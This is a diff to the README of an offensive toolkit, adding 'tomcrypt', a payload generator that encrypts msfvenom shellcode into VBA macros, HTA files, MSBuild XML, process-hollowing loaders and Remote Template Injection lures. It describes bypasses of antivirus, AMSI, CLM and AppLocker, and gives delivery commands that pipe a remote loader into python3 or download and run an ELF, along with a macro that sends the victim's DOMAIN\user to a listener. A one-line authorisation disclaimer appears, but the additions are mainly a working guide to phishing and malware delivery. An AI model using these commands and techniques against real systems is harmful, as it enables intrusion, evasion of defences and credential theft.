@@ -1,17 +1,18 @@
 # TomSploit
 
-A small toolkit for authorised network assessment work. Two tools, both
-enumeration‑first: they find and report, then hand you the exact
-follow‑up commands. Neither exploits, dumps, or loots.
+A small toolkit for authorised network assessment work. Three tools covering
+the full lab pipeline: recon, credential triage, and payload delivery.
 
 | Tool | What it does |
 |------|--------------|
 | [**tombuster**](#tombuster) | Staged `nmap` recon. Maps and names a whole subnet, reports on every host, then runs the slow per‑host enumeration. |
 | [**tomsploit**](#tomsploit) | Fast [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`) triage. Sprays a credential set across protocols, confirms what's valid, and writes a Kerberos delegation walkthrough. |
+| [**tomcrypt**](#tomcrypt) | Payload generator. Encrypts msfvenom shellcode (AES‑256‑CBC or XOR) and wraps it in a choice of delivery formats: VBA macros, HTA files, MSBuild XML, process hollowing, Remote Template Injection, Ligolo‑ng tunnel, and Linux loaders. |
 
 The usual order is `tombuster` first — it tells you what's on the wire and
 which hosts are domain controllers — then `tomsploit` once you have a
-credential to try.
+credential to try, and `tomcrypt` to build the payload once you have a
+foothold or a phishing opportunity.
 
 > Use only against systems you are authorised to test.
 
@@ -452,6 +453,118 @@ Run `tomsploit --help` for the complete list.
   levers.
 - **tombuster refuses runs over 64 resolved hosts** by default
   (`--max-hosts`), so a mistyped CIDR doesn't become an incident.
+
+---
+
+# tomcrypt
+
+Payload generator. Takes a Metasploit payload string, generates shellcode
+with `msfvenom`, encrypts it (AES‑256‑CBC or XOR depending on format), and
+outputs ready‑to‑deliver files — macros, HTA pages, MSBuild XML, compiled
+binaries, and Linux loaders — together with the exact msfconsole handler and
+delivery commands.
+
+```bash
+python3 tomcrypt.py --help
+python3 tomcrypt.py vba runner -H tun0 -P 443
+python3 tomcrypt.py hta msbuild -H 10.10.10.1 -P 443
+python3 tomcrypt.py linux -H tun0 -f py
+```
+
+## Subcommands
+
+| Subcommand | Format options | Technique |
+|---|---|---|
+| `vba enum` | `.bas` macro | Reconnaissance — fires on document open, POSTs process name, Office arch, and `DOMAIN\user` back to your listener |
+| `vba runner` | `.bas` macro | XOR‑encrypted shellcode self‑runner embedded in VBA; no download, no `Add-Type` |
+| `vba cradle` | `.bas` macro | Download‑and‑execute cradle — fetches `exe`, `ps1`, or `txt` payload from your HTTP server |
+| `vba rti` | `.dotm` + `.docx` + `.bas` | Remote Template Injection — macro‑free lure `.docx` silently fetches macro‑enabled `.dotm`; bypasses AV attachment scan |
+| `hta enum` | `.hta` | Reconnaissance HTA — hostname, user, domain, OS/process arch; POSTs back and closes |
+| `hta msbuild` | `.hta` | AES‑encrypted C# inline task, compiled on target by `MSBuild.exe`; bypasses CLM and AppLocker |
+| `hta installutil` | `.hta` | AES‑encrypted Installer subclass; compiled on Kali, certutil‑encoded, delivered via HTA; bypasses CLM and AppLocker |
+| `hollow` | `exe` / `ps1` / `txt` | `exe`: D/Invoke process hollowing (no P/Invoke); `ps1`/`txt`: AMSI bypass + cross‑process inject (x64) or self‑inject (x86) |
+| `msbuild` | `.xml` | AES‑encrypted shellcode in MSBuild inline task; one `MSBuild.exe` command on target; bypasses CLM |
+| `ligolo` | `.xml` | Wraps `agent.exe` → donut shellcode → AES → MSBuild XML; connect parameters baked in at generation time |
+| `linux` | `py` / `elf` | `py`: Python ctypes script, no compilation on target; `elf`: gcc‑compiled ELF; both use AES‑256‑CBC + mmap/mprotect self‑injection |
+
+All Windows shellcode formats support both 32‑ and 64‑bit Office/targets via
+`#If Win64` conditional compilation in VBA and architecture‑aware msfvenom flags
+elsewhere. Pass the msfvenom payload string with `-p` to target x86:
+
+```bash
+python3 tomcrypt.py vba runner -H tun0 -P 443 -p windows/x86/meterpreter/reverse_tcp
+```
+
+## The VBA enum output
+
+The reconnaissance macro POSTs a single form‑encoded line to your listener:
+
+```
+proc=WINWORD.EXE&arch=x64&user=CORP\jsmith
+```
+
+Start a listener with `nc -lvnp 80` before delivering the document, or any
+HTTP server that logs POST bodies.
+
+## Remote Template Injection (`vba rti`)
+
+Three files are written:
+
+| File | Role |
+|---|---|
+| `STEM_lure.docx` | Deliver this to the target — contains no macros |
+| `STEM.dotm` | Host this on your HTTP server — contains the VBA shellcode runner |
+| `STEM.bas` | Raw VBA source for manual import into Word/LibreOffice |
+
+Word fetches `.dotm` silently on open and fires `AutoOpen` / `Document_Open`
+without the normal macro warning that an inlined macro triggers. The lure
+`.docx` is macro‑free and typically passes AV attachment scanning.
+
+`tomcrypt` will attempt to create `.dotm` automatically using LibreOffice UNO
+headless if `soffice` is in `PATH`. If it isn't, the tool prints step‑by‑step
+instructions for creating the template manually.
+
+```bash
+python3 tomcrypt.py vba rti -H 10.10.10.1 -P 443 --serve-port 80 -o invoice
+# → invoice.bas, invoice.dotm (if LibreOffice available), invoice_lure.docx
+```
+
+## Ligolo‑ng tunnel
+
+Converts `agent.exe` to position‑independent shellcode with `donut`, encrypts
+it with AES‑256‑CBC, and embeds it in an MSBuild inline task. The connection
+parameters are baked in so the target only needs to run one command:
+
+```bash
+# On Kali — build the payload
+python3 tomcrypt.py ligolo -H 10.10.10.1 -P 11601 -i agent.exe -o tunnel
+
+# On target
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe tunnel.xml
+```
+
+## Linux loaders
+
+Two formats, both AES‑256‑CBC decrypt + mmap/mprotect self‑injection:
+
+```bash
+# Python ctypes (no compilation on target — just pip install cryptography)
+python3 tomcrypt.py linux -H tun0 -f py
+# Delivery: curl -s http://LHOST/loader.py | python3
+
+# Compiled ELF (gcc on Kali, libssl on target)
+python3 tomcrypt.py linux -H tun0 -f elf
+# Delivery: curl -s -o /tmp/l http://LHOST/loader && chmod +x /tmp/l && /tmp/l
+```
+
+## Requirements
+
+- **Python 3.10+**
+- **[msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)** on `PATH` — all formats except `ligolo`
+- **[donut](https://github.com/TheWover/donut)** (`donut` binary) on `PATH` — `ligolo` only
+- **gcc + libssl‑dev** — `linux elf` only
+- **LibreOffice** (`soffice`) — optional; enables automatic `.dotm` creation for `vba rti`; falls back to manual instructions if absent
+- **`cryptography`** Python package — Linux `py` loader on target only (`pip install cryptography`)
 
 ---
 
